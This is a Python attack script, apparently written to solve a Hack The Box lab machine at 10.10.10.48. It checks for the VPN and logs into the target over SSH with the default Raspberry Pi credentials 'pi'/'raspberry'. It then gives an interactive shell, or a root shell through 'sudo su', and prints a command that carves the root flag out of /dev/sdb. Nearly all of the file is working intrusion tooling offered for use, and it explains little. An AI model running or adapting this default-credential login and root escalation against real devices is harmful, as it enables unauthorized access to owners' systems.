
import sys
import time as cm
import subprocess
import paramiko
import paramiko.ssh_exception
from pwn import *
from bs4 import BeautifulSoup
from colorama import Fore, init
from consolemenu import SelectionMenu

init(autoreset=True)

def banner():
    bnn = """
                                                  ______
                                               .-"      "-.       ▓█████ ▄████▄   ██░ ██  ██ ▄█▀    
                                              /            /      ▓█   ▀▒██▀ ▀█  ▓██░ ██▒ ██▄█▒            
                                             |              |     ▒███  ▒▓█    ▄ ▒██▀▀██░▓███▄░        
                                             |,  .-.  .-.  ,|     ▒▓█  ▄▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ 
                                             | )(_o/  \o_)( |     ░▒████▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄
                                             |/     /\     \|     ░░ ▒░ ░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒  
                                   (@_       (_     ^^     _)      ░ ░  ░ ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░
                              _     ) \_______\__|IIIIII|__/_____  ░  ░         ░  ░░ ░░ ░░ ░ 
                             (_)@8@8{}<________|-\IIIIII/-|___________________________>
                                    )_/        \          /
                                   (@           `--------`
    """
    print(Fore.RED + f"{bnn}")

global machine_ip
global target_machine

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.10.48"

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(Fore.RED + f"\n\t\t~ [HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
            print(Fore.LIGHTWHITE_EX + f"\t\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n")
        else:
            print(Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [Vpn-Status] {e}")

def user_default_hackthebox():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ') # if hackthebox change ip, change this parameter.
        #machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
        print(Fore.CYAN + f"\t\t\t~ [Default User Connection]")
        print(Fore.RED + f"\n\t\t\t\t [HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(Fore.RED + f"\t\t\t\t\t[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(Fore.RED + f"\t\t\t\t\t[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(Fore.RED + f"\t\t\t\t\t[Target Exploit] > " + Fore.YELLOW + f"x-pi-hole")
        else:
            print(Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked OpenAdmin Network")
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")


def unlocked(): 
    try:
        checker_status()
        user_default_hackthebox()
        
        # Menu seleccionar usuario a conectarse. www-data, jimmy, joanna, root
        while True:
            users=["pi", "root", "exit"]
            client = paramiko.SSHClient()
            host = target_machine
            username = "pi"
            password = "raspberry"
            
            print(Fore.MAGENTA + f"\n\t\t ~ [M3NU 0PT1ONS S3L3CT10N]\n")
            for index,user in enumerate(users):
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Menu Options] > " + Fore.GREEN + f"{index+1} > {user}")
            
            print(Fore.LIGHTYELLOW_EX+f"\t\t\t\t\t/----------------------------/")
            user_call= int(input(f"\t\t\t\t    ~ What ur user select? > "))
            
            if user_call == 1:
                try:
                    print(Fore.CYAN + f"\n\t\t ~ [Connection to api :)]\n")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Credential Default x-pi-hole] > " + Fore.GREEN + f" [ Active ]")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Credentials] > " + Fore.GREEN + f"Username: {username}, Password: {password}")
                    cm.sleep(.5)
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(host, username=username, password=password)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.GREEN + f"Succeslly")
                    #init shell
                    shell = client.invoke_shell()
                    shell.settimeout(1)
                    while True:
                        if shell.recv_ready():
                            output = shell.recv(1024).decode('utf-8')
                            print(output, end="")
                            
                        command = input("$ ")
                        if command.lower() in ["exit", "quit"]:
                            print("\n[!] Closing connection...")
                            break
                        
                        shell.send(command + "\n")
                        time.sleep(0.5)

                        while shell.recv_ready():
                            output = shell.recv(15000).decode('latin-1')  # Usa otro códec que maneje los bytes
                            print(output, end="")

                    shell.close()
                    client.close()
                    break
                except paramiko.ssh_exception.NoValidConnectionsError:
                    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
                    break
            #strings /dev/sdb | grep "root.txt" -A 3 
            elif user_call == 2:
                try:
                    print(Fore.CYAN + f"\n\t\t ~ [Connection to R00t :)]\n")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Command Use Flag] > " + Fore.GREEN + f"strings /dev/sdb | grep \"root.txt\" -A 3 ")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Credentials] > " + Fore.GREEN + f"Username: {username}, Password: {password}")
                    cm.sleep(.5)
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(host, username=username, password=password)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.GREEN + f"Succeslly")
                    #init shell
                    shell = client.invoke_shell()
                    shell.settimeout(1)
                    shell.send("sudo su" + "\n")
                    while True:
                        if shell.recv_ready():
                            output = shell.recv(1024).decode('utf-8')
                            print(output, end="")
                            
                        command = input("$ ")
                        if command.lower() in ["exit", "quit"]:
                            print("\n[!] Closing connection...")
                            break
                        
                        shell.send(command + "\n")
                        time.sleep(0.5)

                        while shell.recv_ready():
                            output = shell.recv(15000).decode('latin-1')  # Usa otro códec que maneje los bytes
                            print(output, end="")
                except paramiko.ssh_exception.NoValidConnectionsError:
                    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
                    break
            
            elif user_call == 3:
                print(Fore.GREEN + f"\n\t\t\t\t\t[Exploit Message - Exit Pwned] :/")
                print(Fore.GREEN + f"\t\t\t\t\t\t        [G00d H4ck1ng :@ ]\n")
                break
            else:
                break
    except subprocess.CalledProcessError as e:
        print(f"Function main {e}")


if __name__ == '__main__':
    banner()
    unlocked()
